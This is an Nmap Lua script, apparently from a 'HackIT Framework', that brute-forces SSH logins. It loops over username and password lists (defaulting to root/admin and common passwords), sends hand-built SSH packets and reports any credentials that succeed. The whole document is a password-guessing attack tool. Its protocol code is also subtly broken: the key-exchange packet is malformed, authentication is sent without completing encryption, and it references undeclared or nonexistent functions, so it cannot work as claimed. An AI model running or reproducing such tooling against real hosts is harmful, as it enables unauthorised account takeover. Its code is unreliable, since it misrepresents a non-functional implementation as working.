local stdnse = require "stdnse"
local nmap = require "nmap"
local os = require "os"
local math = require "math"
local shortport = require "shortport"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Attempts to brute-force SSH credentials using user-provided credential lists.
Performs banner exchange, SSH protocol negotiation, and attempts
SSH_MSG_USERAUTH_REQUEST with the "password" method. Checks for
SSH_MSG_USERAUTH_SUCCESS (52) or SSH_MSG_USERAUTH_FAILURE (51) response.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"brute", "intrusive"}

local function load_list(arg_names, default)
  local val = stdnse.get_script_args(arg_names) or default
  if not val or val == "" then return {} end
  local f, err = io.open(val, "r")
  if f then
    local lines = {}
    for line in f:lines() do
      line = gsub(line, "^%s+", ""):gsub("%s+$", "")
      if line ~= "" and byte(line) ~= 35 then
        insert(lines, line)
      end
    end
    f:close()
    return lines
  end
  local items = {}
  for item in gmatch(val, "[^,]+") do
    item = gsub(item, "^%s+", ""):gsub("%s+$", "")
    if item ~= "" then insert(items, item) end
  end
  return items
end

local function ssh_read_packet(socket)
  local status, len_bytes = socket:receive_bytes(4)
  if not status then return nil end
  local pkt_len = byte(len_bytes, 1) * 256 * 256 * 256 + byte(len_bytes, 2) * 256 * 256 + byte(len_bytes, 3) * 256 + byte(len_bytes, 4)
  if pkt_len < 1 or pkt_len > 65536 then return nil end
  local status, rest = socket:receive_bytes(pkt_len)
  if not status then return nil end
  local padding_len = byte(rest, 1)
  local payload_len = pkt_len - padding_len - 1
  if payload_len < 1 then return nil end
  local pkt_type = byte(rest, 2)
  local payload = sub(rest, 3, 2 + payload_len - 1)
  return pkt_type, payload
end

local function ssh_make_packet(pkt_type, payload)
  local pad_len = 8 - ((#payload + 6) % 8)
  if pad_len < 4 then pad_len = pad_len + 8 end
  local total_len = 1 + #payload + pad_len
  local pkt = char(
    bit.rshift(total_len, 24) % 256,
    bit.rshift(total_len, 16) % 256,
    bit.rshift(total_len, 8) % 256,
    total_len % 256
  )
  pkt = pkt .. char(pad_len) .. char(pkt_type) .. payload
  for i = 1, pad_len do
    pkt = pkt .. char(math.random(1, 255))
  end
  return pkt
end

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.number == 22 end

action = function(host, port)
  local users = load_list({"brute-ssh.users", "users"}, "root,admin")
  local passes = load_list({"brute-ssh.passwords", "passwords"}, "password,12345,admin")
  local delay = tonumber(stdnse.get_script_args({"brute-ssh.delay", "delay"}) or 100)
  local max_attempts = tonumber(stdnse.get_script_args({"brute-ssh.max_attempts", "max_attempts"}) or 1000)
  local timeout = tonumber(stdnse.get_script_args({"brute-ssh.timeout", "timeout"}) or 10)
  local stop_on_first = stdnse.get_script_args({"brute-ssh.stop_on_first", "stop_on_first"})
  if stop_on_first == nil or stop_on_first == "" then stop_on_first = true
  else stop_on_first = (lower(stop_on_first) == "true" or stop_on_first == "1") end

  local start_time = os.time()
  local found = {}
  local attempts = 0
  local errors = 0
  local success_count = 0
  local stop = false

  local kex_cookie = ""
  for i = 1, 16 do
    kex_cookie = kex_cookie .. char(math.random(0, 255))
  end

  for _, u in ipairs(users) do
    if stop then break end
    for _, p in ipairs(passes) do
      if stop or attempts >= max_attempts then break end
      local socket = new_socket()
      socket:set_timeout(timeout * 1000)
      local ok, result = pcall(function()
        local status, err = socket:connect(host, port)
        if not status then errors = errors + 1; return false end

        local server_banner = socket:receive_bytes(128)
        if not server_banner or not find(server_banner, "SSH") then
          socket:close()
          return false
        end

        socket:send("SSH-2.0-HackIT_brute\r\n")

        local kex_payload = kex_cookie
        kex_payload = kex_payload .. "\x00\x00\x00\x0b" .. "ssh-rsa\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x0b" .. "ssh-rsa\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x0d" .. "aes256-ctr\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x0d" .. "aes256-ctr\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x0c" .. "hmac-sha1\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x0c" .. "hmac-sha1\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x01\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x01\x00"
        kex_payload = kex_payload .. "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        local kex_pkt = ssh_make_packet(20, kex_payload)
        socket:send(kex_pkt)

        local kex_type = ssh_read_packet(socket)
        if not kex_type then
          local auth_payload = char(0, 0, 0, #u) .. u
            .. char(0, 0, 0, 14) .. "ssh-connection"
            .. char(0, 0, 0, 8) .. "password"
            .. char(0)
            .. char(0, 0, 0, #p) .. p
          local auth_pkt = ssh_make_packet(50, auth_payload)
          socket:send(auth_pkt)
          local auth_type = ssh_read_packet(socket)
          socket:close()
          return auth_type == 52
        end

        local svc_type = ssh_read_packet(socket)
        if svc_type == 6 then
          svc_type = ssh_read_packet(socket)
        end

        local auth_payload = char(0, 0, 0, #u) .. u
          .. char(0, 0, 0, 14) .. "ssh-connection"
          .. char(0, 0, 0, 8) .. "password"
          .. char(0)
          .. char(0, 0, 0, #p) .. p
        local auth_pkt = ssh_make_packet(50, auth_payload)
        socket:send(auth_pkt)
        local auth_type = ssh_read_packet(socket)
        socket:close()
        return auth_type == 52
      end)
      if not ok then
        pcall(socket.close, socket)
      end
      if result then
        success_count = success_count + 1
        insert(found, {user = u, password = p})
        if stop_on_first then stop = true end
      end
      attempts = attempts + 1
      if delay > 0 and not stop then sleep(delay / 1000) end
    end
  end

  local elapsed = os.time() - start_time
  local out = output_table()
  out.service = "SSH"
  out.port = port.number
  out.attempts = attempts
  out.success_count = success_count
  out.time_taken = elapsed .. "s"
  if #found > 0 then
    out.status = "VULNERABLE"
    out.found_credentials = found
  else
    out.status = "SECURE"
  end
  if errors > 0 then out.errors = errors end
  return out
end
